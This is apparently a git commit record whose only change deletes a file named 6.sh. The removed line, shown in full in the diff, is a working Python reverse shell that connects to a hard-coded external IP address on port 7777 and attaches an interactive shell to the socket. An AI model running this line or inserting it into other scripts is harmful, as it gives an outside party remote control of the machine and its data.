126ff888131779809da7112210909925454b0e69
没咸鱼的梦想 <466375758@qq.com>
2021-03-21 16:02:25 +0800

    Delete 6.sh

--- 6.sh
+++
@@ -1,1 +0,0 @@
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("95.179.187.132",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
